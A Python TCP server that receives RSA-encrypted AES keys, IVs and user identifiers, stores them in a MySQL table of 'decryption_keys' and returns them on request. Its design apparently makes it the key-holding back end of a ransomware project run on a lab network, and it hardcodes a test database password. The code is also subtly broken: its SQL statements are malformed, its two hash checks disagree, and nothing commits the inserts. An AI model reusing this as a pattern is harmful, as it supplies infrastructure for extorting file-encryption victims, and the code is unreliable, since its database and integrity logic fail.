import hashlib
import socket
import threading
import os

import pymysql
import rsa
from pymysql import IntegrityError

HOST = "10.0.2.5"
PORT = 6000
MAX_BUFFER_SIZE = 2048

MAX_KEY_REQUESTS = 3


def setup_database():
    db = pymysql.connect(
        host="localhost",
        user="tanuki",
        password="Test_Password_83"
    )
    cursor = db.cursor()

    cursor.execute("CREATE DATABASE IF NOT EXISTS tanuki_den")

    cursor.close()
    db.close()

    db = pymysql.connect(
        host="localhost",
        user="tanuki",
        password="Test_Password_83",
        database="tanuki_den"
    )
    cursor = db.cursor()

    cursor.execute("CREATE TABLE IF NOT EXISTS decryption_keys("
                   "id INT AUTO_INCREMENT PRIMARY KEY, "
                   "user_identifier VARBINARY(16), "
                   "decryption_key VARBINARY(255), "
                   "decryption_iv VARBINARY(16), "
                   "INDEX idx USING HASH (user_identifier))")

    cursor.close()

    return db


def store_into_database(db_connection, user_identifier, decryption_key, decryption_iv):
    try:
        cursor = db_connection.cursor()

        cursor.execute("INSERT INTO TABLE decryption_keys(user_identifier, decryption_key, decryption_iv) "
                       "VALUES(%s, %s, %s)",
                       (user_identifier, decryption_key, decryption_iv))
        cursor.close()
        return True
    except IntegrityError:
        return False


def retrieve_from_database(db_connection, user_identifier):
    cursor = db_connection.cursor()

    cursor.execute("SELECT decryption_key, decryption_iv"
                   "FROM decryption_keys"
                   "WHERE user_identifier = %s"
                   "LIMIT 1",
                   user_identifier)

    if cursor.rowcount > 0:
        result = cursor.fetchall()

        cursor.close()

        return result[0], result[1]
    else:
        return None, None


def format_address(client_address):
    return f"{client_address[0]}:{client_address[1]}"


def listen_to_client(client_socket, client_address, private_key, public_key, db_connection):
    key_requests = 0

    while True:
        encrypted_message = client_socket.recv(MAX_BUFFER_SIZE)

        if not encrypted_message:
            print(f"Connection interrupted by client from {format_address(client_address)}")
            client_socket.close()
            break

        operation = rsa.decrypt(encrypted_message, private_key)

        end_request = False

        if operation == b"retrieve":
            print(f"Received request for decryption key from {format_address(client_address)}")
            user_identifier_encrypted = client_socket.recv(MAX_BUFFER_SIZE)
            user_identifier = rsa.decrypt(user_identifier_encrypted, private_key)

            aes_key, aes_iv = retrieve_from_database(db_connection, user_identifier)

            if aes_key is not None and aes_iv is not None:
                aes_hash = hashlib.sha256(aes_key + aes_key).digest()

                aes_key_encrypted = rsa.encrypt(aes_key, public_key)
                aes_iv_encrypted = rsa.encrypt(aes_iv, public_key)
                aes_hash_encrypted = rsa.encrypt(aes_hash, public_key)

                print(f"Sending decryption key to {format_address(client_address)}")
                client_socket.sendall(aes_key_encrypted)
                client_socket.sendall(aes_iv_encrypted)
                client_socket.sendall(aes_hash_encrypted)
            else:
                print(f"Received request for a nonexistent decryption key from {format_address(client_address)}")
                end_request = True
        elif operation == b"store" and key_requests < MAX_KEY_REQUESTS:
            key_requests += 1

            print(f"Received key storing request from {format_address(client_address)}")

            aes_key_encrypted = client_socket.recv(MAX_BUFFER_SIZE)
            aes_iv_encrypted = client_socket.recv(MAX_BUFFER_SIZE)
            user_identifier_encrypted = client_socket.recv(MAX_BUFFER_SIZE)
            aes_hash_encrypted = client_socket.recv(MAX_BUFFER_SIZE)

            aes_key = rsa.decrypt(aes_key_encrypted, private_key)
            aes_iv = rsa.decrypt(aes_iv_encrypted, private_key)
            user_identifier = rsa.decrypt(user_identifier_encrypted, private_key)

            aes_hash = rsa.decrypt(aes_hash_encrypted, private_key)

            calculated_hash = hashlib.sha256(aes_key + aes_iv + user_identifier)

            if aes_hash == calculated_hash.digest():
                print(f"AES decryption key successfully stored for {format_address(client_address)}")
                success = store_into_database(db_connection, user_identifier, aes_key, aes_iv)

                if success:
                    answer = "keySuccess"
                else:
                    answer = "keyFailure"
            else:
                print(f"AES decryption key hashes do not match for {format_address(client_address)}")
                answer = "keyFailure"

            print(f"Sending feedback for storing outcome to {format_address(client_address)}")
            encrypted_answer = rsa.encrypt(bytes(answer, encoding="utf-8"), public_key)
            client_socket.sendall(encrypted_answer)
        elif operation == b"endRequest" or key_requests >= MAX_KEY_REQUESTS:
            end_request = True
        else:
            print(f"Incorrect operation request received from {format_address(client_address)}")
            end_request = True

        if end_request:
            print(f"Closing client socket for {format_address(client_address)}")
            client_socket.close()
            break


def start_server():
    db_connection = setup_database()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(10)

    print(f"Server listening on {HOST}:{PORT}")

    with open("./RSA_KEYS/TestPrivateKey_SERVER", "rb") as file:
        byte = file.read()

    private_key = rsa.PrivateKey.load_pkcs1(byte, "DER")

    with open("./RSA_KEYS/TestPublicKey_CLIENT", "rb") as file:
        byte = file.read()

    public_key = rsa.PublicKey.load_pkcs1(byte, "DER")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Accepted connection from {format_address(client_address)}")

        threading.Thread(
            target=listen_to_client,
            args=(client_socket, client_address, private_key, public_key, db_connection)
        ).start()


if __name__ == "__main__":
    start_server()
